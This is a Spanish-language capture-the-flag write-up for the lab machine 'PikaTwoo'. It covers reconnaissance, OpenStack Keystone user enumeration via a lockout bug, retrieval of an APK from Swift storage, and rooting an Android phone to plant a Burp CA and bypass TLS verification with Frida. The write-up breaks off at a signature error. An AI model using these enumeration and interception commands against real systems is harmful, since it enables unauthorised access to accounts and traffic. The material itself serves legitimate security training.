---
layout: post
title: PikaTwoo
date: 2023-09-11
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/PikaTwoo-htb/PikaTwoo.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos


***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.199 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 15:50 GMT
Nmap scan report for 10.10.11.199
Host is up (0.065s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
4369/tcp  open  epmd
5000/tcp  open  upnp
5672/tcp  open  amqp
8080/tcp  open  http-proxy
25672/tcp open  unknown
35357/tcp open  openstack-id

Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,443,4369,5000,5672,8080,25672,35357 10.10.11.199 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 15:51 GMT
WARNING: Service 10.10.11.199:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.11.199
Host is up (0.37s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 f3:92:2d:fd:84:22:d7:8d:f6:b0:9e:78:8e:b9:3b:e7 (RSA)
|   256 01:e4:3e:c0:66:43:df:25:af:8a:71:b8:39:06:df:9f (ECDSA)
|_  256 4f:ec:39:76:4e:71:94:71:be:fa:7f:fa:a6:a8:16:74 (ED25519)
80/tcp    open  http     nginx 1.18.0
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-server-header: nginx/1.18.0
|_http-title: Pikaboo
443/tcp   open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: APISIX/2.10.1
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=api.pokatmon-app.htb/organizationName=Pokatmon Ltd/stateOrProvinceName=United Kingdom/countryName=UK
| Not valid before: 2021-12-29T20:33:08
|_Not valid after:  3021-05-01T20:33:08
4369/tcp  open  epmd     Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
5000/tcp  open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-ea5e8a92-990e-4d65-993f-160a29b2cba6
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 300 MULTIPLE CHOICES
|     Content-Type: application/json
|     Location: http://pikatwoo.pokatmon.htb:5000/v3/
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-99d0d8e1-d49f-4433-8652-88b9f785d826
|     {"versions": {"values": [{"id": "v3.14", "status": "stable", "updated": "2020-04-07T00:00:00Z", "links": [{"rel": "self", "href": "http://pikatwoo.pokatmon.htb:5000/v3/"}], "media-types": [{"base": "application/json", "type": "application/vnd.openstack.identity-v3+json"}]}]}}
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-7bcad5fe-96ee-49b9-9f86-d7bf191449f3
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-b94d2452-1480-4602-bd14-3d52ed454dae
|   SIPOptions: 
|_    SIP/2.0 200 OK
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
5672/tcp  open  amqp     RabbitMQ 3.8.9 (0-9)
| amqp-info: 
|   capabilities: 
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@pikatwoo.pokatmon.htb
|   copyright: Copyright (c) 2007-2020 VMware, Inc. or its affiliates.
|   information: Licensed under the MPL 2.0. Website: https://rabbitmq.com
|   platform: Erlang/OTP 23.2.6
|   product: RabbitMQ
|   version: 3.8.9
|   mechanisms: AMQPLAIN PLAIN
|_  locales: en_US
8080/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
25672/tcp open  unknown
35357/tcp open  http     nginx 1.18.0
| http-title: Site doesn't have a title (application/json).
|_Requested resource was http://10.10.11.199:35357/v3/
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94%I=7%D=9/11%Time=64FF3779%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1DC,"HTTP/1\.0\x20300\x20MULTIPLE\x20CHOICES\r\nContent-Type:\
SF:x20application/json\r\nLocation:\x20http://pikatwoo\.pokatmon\.htb:5000
SF:/v3/\r\nVary:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-99d0d8e
SF:1-d49f-4433-8652-88b9f785d826\r\n\r\n{\"versions\":\x20{\"values\":\x20
SF:\[{\"id\":\x20\"v3\.14\",\x20\"status\":\x20\"stable\",\x20\"updated\":
SF:\x20\"2020-04-07T00:00:00Z\",\x20\"links\":\x20\[{\"rel\":\x20\"self\",
SF:\x20\"href\":\x20\"http://pikatwoo\.pokatmon\.htb:5000/v3/\"}\],\x20\"m
SF:edia-types\":\x20\[{\"base\":\x20\"application/json\",\x20\"type\":\x20
SF:\"application/vnd\.openstack\.identity-v3\+json\"}\]}\]}}")%r(RTSPReque
SF:st,AC,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET\r\nVary:\x20X-Auth-Token\r
SF:\nx-openstack-request-id:\x20req-b94d2452-1480-4602-bd14-3d52ed454dae\r
SF:\n\r\n")%r(HTTPOptions,AC,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET\r\nVar
SF:y:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-7bcad5fe-96ee-49b9
SF:-9f86-d7bf191449f3\r\n\r\n")%r(FourOhFourRequest,180,"HTTP/1\.0\x20404\
SF:x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary
SF::\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-ea5e8a92-990e-4d65-
SF:993f-160a29b2cba6\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x
SF:20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1
SF:>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x
SF:20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manual
SF:ly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\
SF:n")%r(SIPOptions,12,"SIP/2\.0\x20200\x20OK\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.01 seconds
```

Añado el dominio ```pokatmon-app.htb``` y el subdominio ```api.pokatmon-app.htb``` y el dominio ```pokatmon.htb``` con el subdominio ```pikatwoo.pokatmon.htb``` al ```/etc/hosts```

## Puerto 80,8000,443,35357 (HTTP, HTTPS)

La página principal se ve así:

<img src="/writeups/assets/img/PikaTwoo-htb/1.png" alt="">

Hago click en ```Docs``` y me redirige a ```/login```, donde puedo ver un panel de inicio de sesión

<img src="/writeups/assets/img/PikaTwoo-htb/2.png" alt="">

Al introducir una ruta que no existe, devuelve un error

```null
curl -s -X GET http://10.10.11.199/noexiste | jq
{
  "success": "false",
  "message": "Page not found",
  "error": {
    "statusCode": 404,
    "message": "You reached a route that is not defined on this server"
  }
}
```

Se está empleando ```Express``` en ```NodeJS```

<img src="/writeups/assets/img/PikaTwoo-htb/3.png" alt="">

Por el puerto 443, este error cambia

```null
curl -s -k -X GET https://10.10.11.199/noexiste | jq
{
  "error_msg": "404 Route Not Found"
}
```

Este está relaccionado con ```Apache APISIX```

<img src="/writeups/assets/img/PikaTwoo-htb/4.png" alt="">

Aplico fuzzing para descubrir rutas por el puerto 8080

```null
wfuzz -c -t 50 --hc=412 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.199:8080/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.199:8080/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000071:   200        0 L      109 W      1563 Ch     "info"                                                                                                                                         
000045226:   404        0 L      7 W        70 Ch       "http://10.10.11.199:8080/"                                                                                                                    
000171479:   200        0 L      1 W        2 Ch        "healthcheck"                                                                                                                                  

Total time: 0
Processed Requests: 220546
Filtered Requests: 220543
Requests/sec.: 0
```

Solo encuentra la ruta ```/info```, y ```/healthcheck``` que no muestra nada de interés. En las cabeceras de respuesta se puede ver que emplea ```OpenStack```

```null
curl -s -X GET http://10.10.11.199:8080/ -I
HTTP/1.1 404 Not Found
Server: nginx/1.18.0
Date: Mon, 11 Sep 2023 09:24:29 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 70
Connection: keep-alive
X-Trans-Id: tx0aa8d42088774c90a023c-0064fedccd
X-Openstack-Request-Id: tx0aa8d42088774c90a023c-0064fedccd
```

Es una plataforma Cloud, y en concreto el puerto 8080 se emplea como almacenamiento de datos

<img src="/writeups/assets/img/PikaTwoo-htb/5.png" alt="">

Tramito una petición por GET al puerto 5000

```null
curl -s -X GET http://10.10.11.199:5000/ | jq
{
  "versions": {
    "values": [
      {
        "id": "v3.14",
        "status": "stable",
        "updated": "2020-04-07T00:00:00Z",
        "links": [
          {
            "rel": "self",
            "href": "http://10.10.11.199:5000/v3/"
          }
        ],
        "media-types": [
          {
            "base": "application/json",
            "type": "application/vnd.openstack.identity-v3+json"
          }
        ]
      }
    ]
  }
}
```

Corresponde a ```OpenStack Keystone```

<img src="/writeups/assets/img/PikaTwoo-htb/6.png" alt="">

Busco vulnerabilidades que estén relacionadas con este servicio y encuentro un CVE que permite un Information Disclosure a través de una Denegación de Servicio

<img src="/writeups/assets/img/PikaTwoo-htb/7.png" alt="">

En las referencias se comparte un enlace a [LaunchPad](https://bugs.launchpad.net/keystone/+bug/1688137) que explican como llevarlo a cabo

<img src="/writeups/assets/img/PikaTwoo-htb/8.png" alt="">

Siguiendo la guía, tramito una petición a ```/v3/auth/tokens/```

```null
curl -s -X POST http://10.10.11.199:5000/v3/auth/tokens -H "Content-Type: application/json" -d '{"auth":{"identity":{"methods":["password"],"password": {"user":{"name":"rubbx","domain":{"id":"default"},"password":"fake_password"}}}}}' | jq
{
  "error": {
    "code": 401,
    "message": "The request you have made requires authentication.",
    "title": "Unauthorized"
  }
}
```

Como no se leakea nada, hago lo mismo en un bucle

```null
echo; while true; do curl -s -X POST http://10.10.11.199:5000/v3/auth/tokens -H "Content-Type: application/json" -d '{"auth":{"identity":{"methods":["password"],"password": {"user":{"name":"admin","domain":{"id":"default"},"password":"fake_password"}}}}}'; sleep 0.3; done | grep user

{"error":{"code":401,"message":"The account is locked for user: 01b5b2fb7f1547f282dc1c62ff0087e1.","title":"Unauthorized"}}
```

Esto me ha devuelto un hash para el usuario ```admin```. Creo otro bucle para enumerar usuarios. En ```wfuzz``` indico dos payloads, uno con el diccionario de usuarios y el otro un rango para introducirlo en la contraseña y así que por cada nombre se pruebe un número de veces

```null
wfuzz -c -t 100 --hh=109 -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -z range,1-20 -d '{"auth":{"identity":{"methods":["password"],"password":{"user":{"name":"FUZZ","domain":{"id":"default"},"password":"fake_passwordFUZ2Z"}}}}}' -H "Content-type: application/json" http://10.10.11.199:5000/v3/auth/tokens
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.199:5000/v3/auth/tokens
Total requests: 203540

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000001706:   401        1 L      7 W        124 Ch      "admin - 6"                                                                                                                                    
000001705:   401        1 L      7 W        124 Ch      "admin - 5"                                                                                                                                    
000001702:   401        1 L      7 W        124 Ch      "admin - 2"                                                                                                                                    
000001714:   401        1 L      7 W        124 Ch      "admin - 14"                                                                                                                                   
000001720:   401        1 L      7 W        124 Ch      "admin - 20"                                                                                                                                   
000001704:   401        1 L      7 W        124 Ch      "admin - 4"                                                                                                                                    
000001716:   401        1 L      7 W        124 Ch      "admin - 16"
```

Se queda colgado, así que copio el archivos ```names.txt``` a mi directorio actual, borro hasta la palabra ```admin``` y sigo el mismo procedimiento

```null
wfuzz -c --hh=109 -w $(pwd)/names.txt -z range,1-20 -d '{"auth":{"identity":{"methods":["password"],"password":{"user":{"name":"FUZZ","domain":{"id":"default"},"password":"fake_passwordFUZ2Z"}}}}}' -H "Content-type: application/json" http://10.10.11.199:5000/v3/auth/tokens
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.199:5000/v3/auth/tokens
Total requests: 201820

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000007708:   401        1 L      7 W        124 Ch      "andrew - 8"                                                                                                                                   
000007707:   401        1 L      7 W        124 Ch      "andrew - 7"                                                                                                                                   
000007706:   401        1 L      7 W        124 Ch      "andrew - 6"                                                                                                                                   
000007703:   401        1 L      7 W        124 Ch      "andrew - 3"                                                                                                                                   
000007705:   401        1 L      7 W        124 Ch      "andrew - 5"                                                                                                                                   
000007702:   401        1 L      7 W        124 Ch      "andrew - 2"                                                                                                                                   
000007701:   401        1 L      7 W        124 Ch      "andrew - 1"        
```

Obtengo al usuario ```andrew```. En la [documentación](https://docs.openstack.org/swift/latest/overview_auth.html) de ```openstack``` se puede ver una forma de autenticarse al servicio de storage, únicamente con el nombre de usuario

<img src="/writeups/assets/img/PikaTwoo-htb/9.png" alt="">

No tiene capacidad de ```Directory Listing``` para ninguno de los dos usuarios

```null
curl -s -X GET http://10.10.11.199:8080/v1/AUTH_admin/
<html><h1>Unauthorized</h1><p>This server could not verify that you are authorized to access the document you requested.</p></html>
```

```null
curl -s -X GET http://10.10.11.199:8080/v1/AUTH_andrew/
<html><h1>Unauthorized</h1><p>This server could not verify that you are authorized to access the document you requested.</p></html>
```

Aplico fuzzing en cada una de ellas

```null
wfuzz -c -t 200 --hh=131 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.199:8080/v1/AUTH_andrew/FUZZ
0********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.199:8080/v1/AUTH_andrew/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000041166:   504        7 L      11 W       167 Ch      "22944"                                                                                                                                        
000064254:   412        0 L      5 W        29 Ch       "%C0"                                                                                                                                          
000152461:   504        7 L      11 W       167 Ch      "nwt_yes"                                                                                                                                      
000173310:   200        1 L      1 W        17 Ch       "android"                                                                                                                                      
000192046:   504        7 L      11 W       167 Ch      "677015"  
```

Tramito una petición por GET a la ruta ```/android```

```null
curl -s -X GET http://10.10.11.199:8080/v1/AUTH_andrew/android
pokatmon-app.apk
```

Descargo este ```apk```

```null
wget http://10.10.11.199:8080/v1/AUTH_andrew/android/pokatmon-app.apk
--2023-09-11 18:25:41--  http://10.10.11.199:8080/v1/AUTH_andrew/android/pokatmon-app.apk
Connecting to 10.10.11.199:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12462792 (12M) [application/vnd.android.package-archive]
Saving to: ‘pokatmon-app.apk’

pokatmon-app.apk                                    100%[===================================================================================================================>]  11.88M   536KB/s    in 21s     

2023-09-11 18:26:06 (584 KB/s) - ‘pokatmon-app.apk’ saved [12462792/12462792]
```

Descargo una ```ISO``` de ```Android``` para ```VmWare``` desde [esta web](https://www.osboxes.org/android-x86/). Al arrancarla, no funciona de primeras. Es necesario retorcar una configuración presionando la tecla ```e``` dos veces y sustituyendo ```quiet``` por ```nomodeset xforcevesa```, posteriormente al enter para guardar y la tecla ```b``` para arrancar

<img src="/writeups/assets/img/PikaTwoo-htb/10.png" alt="">

Desde los ajustes del ```Wifi``` en la máquina, se puede ver la dirección IP que tiene asignada

<img src="/writeups/assets/img/PikaTwoo-htb/11.png" alt="">

Para que aparezcan las opciones de desarrollador, hago click varias veces en el número de compilación que se encuentra en ```About Tablet```. Habilito el ADB por interfaz inalámbrica

<img src="/writeups/assets/img/PikaTwoo-htb/12.png" alt="">

Me conecto con ```adb```

```null
adb connect 10.10.0.129
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 10.10.0.129:5555
```

Listo los dispositivos

```null
adb devices
List of devices attached
10.10.0.129:5555	device
```

Instalo el APK

```null
adb install pokatmon-app.apk
Performing Streamed Install
Success
```

Al abrirla se ve así:

<img src="/writeups/assets/img/PikaTwoo-htb/13.png" alt="">

Configuro un proxy a mi interfaz local de red por el puerto 8080

```null
adb shell settings put global http_proxy 10.10.0.130:8080
```

Y me pongo en escucha desde el ```BurpSuite```

<img src="/writeups/assets/img/PikaTwoo-htb/14.png" alt="">

Pero, por el momento no recibo nada. Desde ```WireShark``` encuentro un nuevo dominio

<img src="/writeups/assets/img/PikaTwoo-htb/15.png" alt="">

Lo tengo que añadir al ```/etc/hosts``` de la máquina Android, apuntando a mi equipo, pero por un problema de permisos no fue posible, debido al sistema de archivos que emplea la versión de Android para VMWare que estoy empleando, así que conecto un dispositivo físico

```null
adb usb
restarting in USB mode
```

```null
adb devices
List of devices attached
66bd68ad7d94	device
```

Utilizo [Magisk](https://github.com/topjohnwu/Magisk) para rootear el dispositivo. Para ello hay que desbloquear el ```bootloader``` y con herramientas como ```adb``` y ```fastboot``` flashear el zip que se encuentra en los Releases. Como recovery emplée [TWRP](https://twrp.me/Devices/)

```null
adb reboot bootloader
```

```null
fastboot boot twrp-3.3.1-0-rolex.img
```

Descargo el certificado de mi ```BurpSuite``` para poder interceptar tráfico con este

```null
curl localhost:8080/cert -o burp.der
```

Lo convierto a un formato apto para copiarlo al Android

```null
openssl x509 -inform der -in burp.der -out burp.pem
```

Al examinarlo puedo ver caracteres en la primera línea. Este va a ser el nuevo nombre con la extensión ```.0```

```null
openssl x509 -inform pem -subject_hash_old -in burp.pem
9a5ba575
-----BEGIN CERTIFICATE-----
MIIDqDCCApCgAwIBAgIFALmwVGUwDQYJKoZIhvcNAQELBQAwgYoxFDASBgNVBAYT
C1BvcnRTd2lnZ2VyMRQwEgYDVQQIEwtQb3J0U3dpZ2dlcjEUMBIGA1UEBxMLUG9y
dFN3aWdnZXIxFDASBgNVBAoTC1BvcnRTd2lnZ2VyMRcwFQYDVQQLEw5Qb3J0U3dp
Z2dlciBDQTEXMBUGA1UEAxMOUG9ydFN3aWdnZXIgQ0EwHhcNMTQwMjEwMTUyNTI1
WhcNMzMwMjEwMTUyNTI1WjCBijEUMBIGA1UEBhMLUG9ydFN3aWdnZXIxFDASBgNV
BAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0U3dpZ2dlcjEUMBIGA1UEChML
UG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2lnZ2VyIENBMRcwFQYDVQQDEw5Q
b3J0U3dpZ2dlciBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANzC
GWuSOmL//JIxvgtN8W3AbjFs+NlNebtzgSnDMWUjOoRXWH900l7I9KYWlli4P4PZ
ioa/S7RuN3Wq98RR4awnc/ro1S7erzFwe9tGe1ocDFNgx5WPwMAfBZAKA3PLOnxk
OUev+gcoDCKHDbO/r9w8uEdtJe2ling4nygpaOPr7knuRY8aAZ1SLzbLrsOOCIID
F/s+xcLZgojiNnsdGVkiCvHR/jmQbvGYg1dNV+ID+j5V4V+LfcS9y0+PgrPkHzVb
yfFWoBZMkknIHfQYz4Gnlcn1hQebQqd1h5AoBZAS1INV9oWrGovYS1yjEOOkHtaU
DRa7eA324bnMq68x+i8CAwEAAaMTMBEwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG
9w0BAQsFAAOCAQEAu4Wo8WVJuYEoMtTOLedRc5nBzv61M9TofRIMDEfjT5EEabuc
7+czgvX/p2E8IU3t/B4YcDbkADvKEh48nL8+jIQh1Vo3kOJ+XgqJYTOZhz16uDiQ
f31dPnBL4tU824ha9xHZRX5F8S2lCEfEa/mLKKnf3AO0dyNeouCEbkwHriFUNsVB
W+4Vmnw5t109fHNscXAjx+wQzqupxrCFCDCKGsuE9jvRTTkGIG4wqlQ7PL12GHyS
hiUIqIhzWyceghWSXsG8oe3huHDgHaUznX28ZnACWt0Wb/UmGIinb48dgyUPPGCv
ZghcFZ9zRRja4o1yvfZBENH+brdZ0coW7FJbew==
-----END CERTIFICATE-----
```

Al spawnear una shell, por defecto estoy como usuarios con bajos privilegios

```null
adb shell
rolex:/ $ whoami
shell
```

Pero al haber rooteado el dispositivo, puedo convertirme en ese usuario y remontar el sistema para tener capacidad de escritura

```null
rolex:/ $ su
rolex:/ # whoami
root
```

```null
rolex:/ # mount -o remount,rw /
```

Lo introduzco en la ruta ```/system/etc/security/cacerts```. Para indicar que quiero guardar y no tengo que introducir más datos, presiono ```Ctrl + D```

```null
rolex:/system/etc/security/cacerts # cat > 9a5ba575.0
-----BEGIN CERTIFICATE-----
MIIDqDCCApCgAwIBAgIFALmwVGUwDQYJKoZIhvcNAQELBQAwgYoxFDASBgNVBAYT
C1BvcnRTd2lnZ2VyMRQwEgYDVQQIEwtQb3J0U3dpZ2dlcjEUMBIGA1UEBxMLUG9y
dFN3aWdnZXIxFDASBgNVBAoTC1BvcnRTd2lnZ2VyMRcwFQYDVQQLEw5Qb3J0U3dp
Z2dlciBDQTEXMBUGA1UEAxMOUG9ydFN3aWdnZXIgQ0EwHhcNMTQwMjEwMTUyNTI1
WhcNMzMwMjEwMTUyNTI1WjCBijEUMBIGA1UEBhMLUG9ydFN3aWdnZXIxFDASBgNV
BAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0U3dpZ2dlcjEUMBIGA1UEChML
UG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2lnZ2VyIENBMRcwFQYDVQQDEw5Q
b3J0U3dpZ2dlciBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANzC
GWuSOmL//JIxvgtN8W3AbjFs+NlNebtzgSnDMWUjOoRXWH900l7I9KYWlli4P4PZ
ioa/S7RuN3Wq98RR4awnc/ro1S7erzFwe9tGe1ocDFNgx5WPwMAfBZAKA3PLOnxk
OUev+gcoDCKHDbO/r9w8uEdtJe2ling4nygpaOPr7knuRY8aAZ1SLzbLrsOOCIID
F/s+xcLZgojiNnsdGVkiCvHR/jmQbvGYg1dNV+ID+j5V4V+LfcS9y0+PgrPkHzVb
yfFWoBZMkknIHfQYz4Gnlcn1hQebQqd1h5AoBZAS1INV9oWrGovYS1yjEOOkHtaU
DRa7eA324bnMq68x+i8CAwEAAaMTMBEwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG
9w0BAQsFAAOCAQEAu4Wo8WVJuYEoMtTOLedRc5nBzv61M9TofRIMDEfjT5EEabuc
7+czgvX/p2E8IU3t/B4YcDbkADvKEh48nL8+jIQh1Vo3kOJ+XgqJYTOZhz16uDiQ
f31dPnBL4tU824ha9xHZRX5F8S2lCEfEa/mLKKnf3AO0dyNeouCEbkwHriFUNsVB
W+4Vmnw5t109fHNscXAjx+wQzqupxrCFCDCKGsuE9jvRTTkGIG4wqlQ7PL12GHyS
hiUIqIhzWyceghWSXsG8oe3huHDgHaUznX28ZnACWt0Wb/UmGIinb48dgyUPPGCv
ZghcFZ9zRRja4o1yvfZBENH+brdZ0coW7FJbew==
-----END CERTIFICATE-----
```

Configuro un proxy por HTTP a mi equipo por la interfaz que está en Bridge

```null
adb shell settings put global http_proxy 192.168.1.50:8080
```

Hay que tener en cuenta que se va a emplear un certificado SSL al no estar en una red NAT, por lo que todavía no voy a poder interceptar datos en bruto. Añado mi IP apuntando al dominio que vi antes de la API

```null
rolex:/ # cat >> /etc/hosts                                                                           
192.168.1.50 api.pokatmon-app.htb
```

Me quedo en escucha con ```netcat``` y al darle a ```Join Beta``` desde la app, intercepto la petición

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.50] from (UNKNOWN) [192.168.1.28] 36756
%31aZ䲢z#`p$+/,0̨̩	
/5
api.pokatmon-app.htb

3&$ 5jxa=l7CvUX#	_g-+
```

Para deshabilitar el TLS (Que permite que el tráfico utilice SSL) empleo [frida](https://sourceforge.net/projects/frida.mirror/files/16.1.4/). Primero necesito saber la arquitectura del procesador

```null
adb shell getprop ro.product.cpu.abi
arm64-v8a
```

En mi caso, para ```arm64```, descargo el [servidor](https://sourceforge.net/projects/frida.mirror/files/16.1.4/frida-server-16.1.4-android-arm.xz/download) que tengo que ejecutar desde el ```Android```. En mi equipo, instalo el cliente con ```pipx install frida-tools```. Descomprimo el archivo que acabo de descargar y transfiero el binario a la máquina, asignándole permisos de ejecución

```null
7z x frida-server-16.1.4-android-arm64.xz
```

```null
adb push frida-server-16.1.4-android-arm64 /data/local/tmp/frida-server
```

```null
rolex:/ # chmod 755 /data/local/tmp/frida-server
```

Después lo ejecuto

```null
rolex:/ # /data/local/tmp/frida-server
```

Con el script [disable-flutter-tls.js](https://raw.githubusercontent.com/NVISOsecurity/disable-flutter-tls-verification/main/disable-flutter-tls.js) puedo conseguir desactivar el TLS, pero necesito el nombre de aplicación. Descomprimo el ```apk``` con ```apktool```

```null
apktool d pokatmon-app.apk
```

El dato que necesito se encuentra en el archivo ```AndroidManifest.xml```

```null
cat pokatmon-app/AndroidManifest.xml | grep package
<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="31" android:compileSdkVersionCodename="12" package="htb.pokatmon.pokatmon_app" platformBuildVersionCode="31" platformBuildVersionName="12">
```

Ejecuto frida y se reinicia la aplicación

```null
frida -U -f htb.pokatmon.pokatmon_app -l disable-flutter-tls.js
     ____
    / _  |   Frida 16.1.4 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Redmi 4A (id=66bd68ad7d94)
Spawning `htb.pokatmon.pokatmon_app`...                                 
[+] Java environment detected
Spawned `htb.pokatmon.pokatmon_app`. Resuming main thread!              
[Redmi 4A::htb.pokatmon.pokatmon_app ]-> [+] libflutter.so loaded
[+] Flutter library found
[!] ssl_verify_peer_cert not found. Trying again...
[+] ssl_verify_peer_cert found at offset: 0x36f3e4
```

Con ```socat```, redirijo el tráfico de mi equipo a la máquina víctima

```null
socat TCP-LISTEN:443,fork TCP:10.10.11.199:443
```
Introduzco de nuevo los datos de inicio de sesión y envío. El mensaje de error cambia a ```Invalid code```

<img src="/writeups/assets/img/PikaTwoo-htb/16.png" alt="">

Configuro un proxy en ```BurpSuite``` para hacer lo mismo que con ```socat``` pero pudiendo interceptar y manipular la petición. Al tener que ponerme en escucha por el puerto 443, tengo que ejecutarlo como ```root```

<img src="/writeups/assets/img/PikaTwoo-htb/17.png" alt="">

Indico la IP donde redirigir el tráfico

<img src="/writeups/assets/img/PikaTwoo-htb/18.png" alt="">

Finalmente, logro capturar la petición

```null
POST /public/validate HTTP/1.1
user-agent: Dart/2.15 (dart:io)
content-type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: gzip, deflate
Content-Length: 58
authorization: signature=fQVUwT9xgVBKSldjchQd/xdxyf0R3Sl/TnbhFG1j+qdbcbV+gmgv9PAHRCXWXLYn8masiYiUUgEG1DQvmkIFAHge8Ui74y+59d80i/gfm1z1hYyIg5pFcbTR/Xvgu1VqdAOmkd27W061BElQRksaoS8d0Oah+4Onb2GAbkBknBbY/+gQGWY7icCTmh5DXX/q6QT3Z/dPG2ggcFoPHUBkjNiV22IclczKcOHAONlKTyXs+/sshEiCygsn8wlRHoPf/SNdV9VYnqUyiS4AsTCe39eGa/aZ1IH3lxRJXeeq7wow9nv7wUGQLEEpe0uXpm5cu/IlozEv4x6IZoW5z0hsTA==
host: api.pokatmon-app.htb
Connection: close

app_beta_mailaddr=test%40test.com&app_beta_code=1234567890
```

La envío al ```Repeater``` para hacer pruebas. Si cambio cualquier valor por POST me da un error de firma

```null
{"error":"invalid signature"}
```

